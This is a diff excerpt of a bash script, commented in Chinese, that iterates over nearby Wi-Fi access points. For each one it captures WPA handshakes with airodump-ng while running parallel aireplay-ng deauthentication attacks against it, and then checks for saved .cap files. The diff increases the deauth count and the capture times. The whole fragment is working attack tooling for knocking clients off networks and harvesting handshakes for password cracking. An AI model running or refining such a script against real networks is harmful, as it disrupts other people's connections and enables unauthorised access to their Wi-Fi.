@@ -21,13 +21,13 @@ do
         echo "正在處理 AP，BSSID: $BSSID, 頻道: $CHANNEL, ESSID: $ESSID"
         
         # 使用 gnome-terminal 進行 airodump-ng 捕捉，終端執行完自動關閉
-        gnome-terminal -- bash -c "sudo timeout 20 airodump-ng --bssid $BSSID -c $CHANNEL -w '$HANDSHAKE_DIR/$ESSID' $INTERFACE"
+        gnome-terminal -- bash -c "sudo timeout 50 airodump-ng --bssid $BSSID -c $CHANNEL -w '$HANDSHAKE_DIR/$ESSID' $INTERFACE"
         
         # 並行執行 deauthentication 攻擊，進行 10 次 deauth 攻擊，終端執行完自動關閉
-        gnome-terminal -- bash -c "sudo aireplay-ng --deauth 10 -a $BSSID $INTERFACE"
+        gnome-terminal -- bash -c "sudo aireplay-ng --deauth 20 -a $BSSID $INTERFACE"
         
         # 延遲 5 秒等待處理下一個 AP
-        sleep 20
+        sleep 50
 
         # 檢查是否成功擷取到握手包
         if ls "$HANDSHAKE_DIR/$ESSID"-*.cap 1> /dev/null 2>&1; then
